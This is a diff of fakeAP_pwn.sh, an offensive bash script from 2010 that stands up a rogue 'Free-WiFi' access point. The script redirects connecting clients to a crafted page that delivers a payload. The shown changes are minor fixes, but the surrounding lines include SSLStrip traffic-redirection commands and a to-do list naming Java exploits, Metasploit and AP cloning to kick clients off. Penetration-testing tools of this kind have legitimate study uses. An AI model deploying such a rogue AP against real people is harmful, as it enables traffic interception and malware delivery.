@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh (v0.3-RC20 2010-07-11)                                                         #
+# fakeAP_pwn.sh (v0.3-RC21 2010-07-11)                                                         #
 #----------------------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -9,25 +9,25 @@
 #   - Slowness                                                                                 #
 #        Try a different MTU value?                                                            #
 #   - No IP                                                                                    #
-#        Try...                                                                               #
+#        Try...                                                                                #
 #   - Wireless N                                                                               #
 #        Doesn't work too well!                                                                #
 #----------------------------------------------------------------------------------------------#
 #ToDo List:                                                                                    #
 # v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
 #                           crafted page without affecting any other clients who are browsing  #
-#                           Create a radius server with:                                       #
+#                           Create a captive portal with:                                      #
 #                               -CoovaChilli                                                   #
 #                               -FreeRadius                                                    #
 #                               -MySQL                                                         #
 # v0.4 - Firewall Rules   - Don't expose local machines from the internet interface            #
+# v0.4 - HostAP           - Add support for HostAP & Hardware AP                               #
 # v0.5 - Java exploit     - Different "delivery system" ;)                                     #
 # v0.6 - Linux/OSX/x64    - Make compatible                                                    #
 # v0.7 - S.E.T.           - Social Engineering Toolkit                                         #
 # Monitor traffic         - That isn't on port 80 before they download the payload             #
 # Metasploit "fun"        - Automate a few more "things"                                       #
 # Clone AP                - Copys SSID & MAC address then kick all...                          #
-# apt-get install hostapd                                                                      #
 #----------------------------------------------------------------------------------------------#
 # Defaults *****~~~Change theses~~~*****
 export            ESSID="Free-WiFi"                  # WiFi Name of the fake network.
@@ -51,7 +51,7 @@ export          verbose=0                            # 0/1/2      - Verbose mode
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3-RC20"
+export   version="0.3-RC21"
 trap 'cleanup' 2 # Interrupt - "Ctrl + C"
 #----------------------------------------------------------------------------------------------#
 function cleanup() {
@@ -212,13 +212,13 @@ fi
 
 if [ "$transparent" == "true" ]; then
    if [ -z "$ourIP" ]; then
-      if [ "$verbose" == "2" ] ; then echo "[i] Command: dhclient $interface"; fi
+      if [ "$verbose" == "2" ]; then echo "[i] Command: dhclient $interface"; fi
       $xterm -geometry 75x15+100+0 -T "fakeAP_pwn v$version - Acquiring an IP Address" -e "dhclient $interface"
       sleep 3
       export ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
       if [ -z "$ourIP" ]; then
          echo -e "\e[00;31m[-]\e[00m IP Problem. Haven't got a IP address on $interface. Try running the script again, once you have!"
-         export pidcheck=`ps ux | awk '/$interface/ && !/awk/ {print $2}'`
+         export pidcheck=`ps aux | grep $interface | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
          if [ -n "$pidcheck" ]; then
             kill $pidcheck # Kill dhclient on the internet interface after it fails to get ip, to prevent errors in restarting the script
          fi
@@ -274,7 +274,7 @@ $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restarting the WiFi inter
 sleep 1
 if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $wifiInterface up"; fi
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restarting the WiFi interface ($wifiInterface) (Starting)" -e "ifconfig $wifiInterface up" &
-export pidcheck2=`ps ux | awk '/$wifiInterface/ && !/awk/ {print $2}'`
+export pidcheck2=`ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
 if [ -n "$pidcheck2" ]; then
    if [ "$verbose" == "2" ] ; then echo "[i] Command: kill $pidcheck2"; fi
    kill $pidcheck2 # Kill everything on the wifi interface before starting monitor mode, to prevent interference
@@ -590,8 +590,6 @@ if [ "$transparent" != "true" ]; then
    sleep 7
 fi
 
-#SSLStrip
-
 echo -e "\e[01;32m[>]\e[00m Starting DHCP server..."
 if [ "$verbose" == "2" ] ;
  then echo "[i] Command: dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0"; fi
@@ -677,7 +675,7 @@ if [ "$extras" == "true" ]; then
    #if [ "$verbose" == "2" ] ; then echo "[i] Command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"; fi
    #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
    #if [ "$verbose" == "2" ] ; then echo "[i] Command: sslstrip -k -f -l 10000"; fi
-   #$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "sslstrip -k -f -l 10000" &
+   #$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "sslstrip -k -f -l 10000" & #SSLStrip
 fi
 
 cleanup
